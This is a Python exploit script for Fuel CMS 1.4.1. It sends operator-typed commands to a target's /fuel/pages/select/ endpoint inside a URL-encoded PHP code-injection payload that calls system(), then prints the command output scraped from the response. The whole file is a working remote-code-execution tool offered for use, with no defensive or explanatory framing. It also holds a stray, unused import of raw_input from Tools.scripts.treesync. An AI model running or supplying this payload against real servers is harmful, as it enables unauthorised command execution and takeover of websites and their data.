import argparse
import urllib.parse
import requests
from Tools.scripts.treesync import raw_input
from bs4 import BeautifulSoup

def main():
    parser = argparse.ArgumentParser(
        description='fuel CMS 1.4.1 - RCE Script',
        epilog='Example: python3 main.py -u "http://192.168.1.4/structure/index.php"',
        formatter_class=argparse.RawDescriptionHelpFormatter
    )
    parser.add_argument('-u', '--url', type=str, help='First argument (str)')
    args = parser.parse_args()
    url = args.url
    while True:
        cmd = input("Enter Command: ")
        if cmd.lower() == "exit":
            break
        exploit = url + (
            "/fuel/pages/select/?filter=%27%2b%70%69%28%70%72%69%6e%74%28%24%61%3d%27%73%79%73%74%65%6d%27%29"
            "%29%2b%24%61%28%27") + urllib.parse.quote(cmd) + "%27%29%2b%27"
        response = requests.get(exploit)
        soup = BeautifulSoup(response.content ,"lxml")
        body = soup.find("p")
        print(body.text)


if __name__ == "__main__":
    main()
